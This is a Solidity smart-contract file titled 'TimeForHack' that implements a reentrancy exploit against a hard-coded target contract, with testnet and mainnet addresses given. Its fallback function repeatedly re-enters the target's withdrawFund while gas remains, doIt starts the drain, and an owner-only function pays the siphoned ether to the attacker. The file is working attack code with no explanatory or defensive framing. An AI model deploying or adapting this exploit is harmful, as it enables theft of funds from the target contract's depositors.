pragma solidity ^0.4.19;

contract Owned {
  address owner;
  function Owned() {
    owner = msg.sender;
  }
  function kill() {
    if (msg.sender == owner) selfdestruct(owner);
  }
}

interface Target {
    function withdrawFund() public;
    function Deposit() public payable;
}

contract TimeForHack is Owned 
{
    address target = 0x8b6f4dd8305c320215e05f19716a2cf53b2d5b92;
    // address target = 0x95D34980095380851902ccd9A1Fb4C813C2cb639; // mainnet
    event Hacked(address indexed by, uint256 amount);
    event Called(address indexed by, uint256 amount);
    
    function () payable {
         Target t = Target(target);
        // let&#39;s hack.
        if (msg.gas < 200000) {
            return;
        }
        Hacked(target, target.balance);
        if (msg.value <= target.balance) {
            t.withdrawFund();
        }    
    }
    
    function doIt() payable {
    
        Called(msg.sender, this.balance);
         Target t = Target(target);
         t.Deposit.value(msg.value)();
         t.withdrawFund();   
    }
    
    function empty() {
        if (msg.sender == owner) {
            msg.sender.transfer(this.balance);
            
        }
    }
    
    function cashout( uint256 v) {
         Target t = Target(target);
         t.withdrawFund();   
    }
    
    function fund() payable {
         Target t = Target(target);
         t.Deposit.value(msg.value)();  
    }
    
    
}